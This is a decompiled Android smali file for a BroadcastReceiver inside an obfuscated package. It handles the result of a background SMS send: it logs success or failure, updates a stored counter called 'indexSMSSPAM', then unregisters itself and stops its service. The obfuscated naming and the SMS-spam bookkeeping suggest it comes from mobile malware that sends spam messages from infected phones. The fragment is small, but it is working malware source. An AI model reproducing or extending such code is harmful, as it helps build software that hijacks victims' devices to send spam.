.class Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;
.super Landroid/content/BroadcastReceiver;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->getResultCode()I

    move-result p2

    const/4 v0, -0x1

    if-eq p2, v0, :cond_0

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "S"

    const-string v1, "Error SMS SENT"

    invoke-virtual {p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "indexSMSSPAM"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "indexSMSSPAM"

    invoke-virtual {v2, p1, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "|"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    :goto_0
    invoke-virtual {p2, p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->c:Landroid/content/BroadcastReceiver;

    invoke-virtual {p1, p2}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->stopSelf()V

    return-void

    :cond_0
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "S"

    const-string v1, "SMS SENT"

    invoke-virtual {p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd$1;->a:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;

    iget-object p2, p2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/dxivifswvkcvwz/dshd;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "indexSMSSPAM"

    const-string v1, ""

    goto :goto_0

    return-void
.end method
